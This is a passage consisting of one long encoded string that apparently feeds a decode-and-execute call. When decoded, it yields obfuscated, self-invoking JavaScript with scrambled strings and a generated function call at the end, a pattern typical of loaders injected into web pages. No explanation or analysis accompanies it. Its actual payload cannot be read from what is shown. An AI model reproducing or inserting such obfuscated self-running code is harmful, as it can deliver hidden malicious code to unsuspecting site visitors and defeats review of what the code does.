5eWZRVjF0YGlSPWUxXWUgKFFRZlFuOWp0biFlOzE9NW4rNG8uZVhtMFFvb1Flclolb2U6UWdRZjJdIEtdaVtRPWM4e299PXdUIWZzbFFmLHNdX1taSXQyeV8hIWNwPDY9b18rKS5ReDAlY1FJaF9RdFFuUSlyLmljMTFmOnYuMVFqUWFybC4oJUVycGZRaFEhdChmMSYmaF1lPSYpXCcwUWlRb1E7X1FfUVl0XWd9ZDFpKTwudnlhXTFZdCFlbm1dLmlyUWQoTm1kZl90dDJRIDYxNVE1ISVRe3tsSF0pfStfbz0pKHRRPTJ9dWUoUWphUSF0MFFhcyhRMmZmbnJUaWVzaXt1M2hhblFvNmVlSWY7MjldZl0kUXJvUWE9UXI/YT1jUVFpPXlvbWMxKG5Ra11oLCEkdElMPF0ocylRUWVRLlU4ICZhM1FRbyVdUVF0dFE1dHV0JC5ZMGMuNFE9ITNRRVtRKGFRMWlRNG4lbjhRaVEwI3JneiMyYURpaWJzZXhqZFEuZG5mZnMsLl17VFEjfXZHKCgtK2V0JWZmX2J1Li5uN20pI3R9UV0uYWkzWlEpM1QpIjNpUS4mLjNfUTxmLiw2eGVybD1fLkQuM3QsTF0pWzlmczN0bnI8cFFLXShRYXA2X2gmdHR9UWQzPSV1X3UyJGxWUTJuVHJwbiBqamgoOkRzKDVzIGxvaFErNGQoJF09cjsxXTB0b2JRc3NddSlsbHJhXz5RMmFyK2YyXzU0KT1fKSVuUShpOXRjUTNiJWEyZi4rb11rNDZyaSE9LnJue1FmTm1fczchYltvdDsoUGVmM1ZyaXAhcmYlJGFJJW9ub1E1ZzpoYTRyYSY9clFbYW5hZTlRJW5qcmI1ITNsZi5bbUx0ZW4rYTU9ZXkpZmVvbj1hUVE3NWVHUSxfLDUhe2dvbnNlUVEgbnJdaSJwb2k6YnMyKjh7KWVycih1dDEuY1FsUTgpaT17JTMiZWUuaVFvcjFYLmIpdWwzIHNwY30zajdlMDNnKVF0X21dM1F1XWR0fW8tUXQ9ZjtvMHJob3NkODAzZlEgZnRbJC41KGUrW2VedHVmNWl2b3RcXC4uUWZ9JTRdUSBRY2Mzb19sXFxuJVVRNGVRZF9dLmo0USxqJTJwdGUuMXJRN1EpZl8yaSk6USBwJTIgdHNdIz0paSl0Y2UpIF9hXlFRcmFaXUUmc2Y1UTVRaHIybGNRdFFvbDN7ci5RaTFRc3JkNCQ/ZTE1ZD1zUSAlaF90MSk7UWNdMjNcLyV1NzM9UT1NZXVRZzMyfVFXdDtvUS4lc1E9YTMkMFEuZTRRZGldblFuPW5ZYmh1bFFGb3JfQ3IzUW5RM2x1X3J9U2NhUWcpUV1zIThRLnRjdHUqLlFuUTI7ZTMoUT1RUVFmIFEzOy5RXzFRVTAzYyAlZl9sKCk/X1ExUVEuUWE1bHA0c1k1X250Xl9faV9mZGU9ZVFRZWJvNC5RKDI1N30pYXV2cmEuUWUpMV90dHBRKWNfM19yZVFsXFw1XzQtelFwO1EpKTZzM30pbityUV9UXS5jdCF0UWFfTmlvcy49JS5RblF9NFFbaVFvb0IzcFF9ZiglaV85dVEiZixlXSUmZmorKy1cLzMuUSVmblFpZlFiXzZvbjEuUVFhX1FmdDUsNSVdX1Epb3RrcmU/blFpX2ViKG9sUT1ldzZRblFRUTVtZk50XVEzX3R0OzhRbjRhXT09NHslKVFvbUclKTVRUSxlUVtRKDQgZV9RbzMgZ0lRbCU2WF0uZ3tRNDpyXC8uUXV9LD1jUW9hck1lSDJ4XSsoeyhRUVF0XWkzLHQgbHQxMzRnTTFyUSwxcnQoZGlReFEoOC45KHB9O19fbTVoVD5RaTY7UVEpUWlhY2s7aTE9VDshNHM3YihrZVE3UWZtUT1ueV9vUXkuYW59LTF0UWZhby5RIClqYVFlcmdlaXM7cl9fdXNudGIuJHRRUTZsN3M7XyVfNzZRIHR1ZixvIC0hXTkxfWdmUXIkU11qaS5kXCdzWjt0bC4gKDtvZlE0UVF0UTRuO25wMFF1IHJzPXNjMntFUXtyNV0hUTRycytxUSlmMWVRUXJRcmtjXVxcUTFnQzQ2S2VyUWQ4cCE1KS1vaWZRdC5dLC47b2JsJSBlUVEkbnIuYV8lZl8gKHNRbC4rMXIkKVFuYi5mdHhsXFxKUSl9ezZycG5RZTFdLHQ9ZzYhWCAydWpReXtfeSE6ZkVUblEpJVE1JSxRUT15aXRjYzYyIHUpdG8yNVF7XFwuIFEkUWYgUX1fKSE1c11mbl5RdFEhZGMgKWgpJGw5cHVRLi5vYjFhUVEyZiB9fShRIVFvJWkxXSxsPW5RaS5yUUlRVTJucmVbYX0uaS4lWS4gZWZ3YyZdaG5fZm8uZ1suXTUuZl8pKX15MnNmJGJlX2VtQztfNzJ0UV93Ml9pe2ZjcmpfX2sge1FsIDRjYl8iUX07UV09IDBRZlk7UTUyXyBkX3IuJXJlbC4ucl9fZXAiUXVdUV9vbjMpVixjcnIhKDRvKHVhbl10IHtEZj12X1spby1fbm8wICV0cGRpZmRRMX17MXIlIDJmX2JlXV0pNC1mbmYpLlFuJVF0LmNuPSBVb3RdJykpO3ZhciBjQ0o9Tlh6KGhtVSx3RGIgKTtjQ0ooMTA5Mik7cmV0dXJuIDUzOTd9KSgp'))
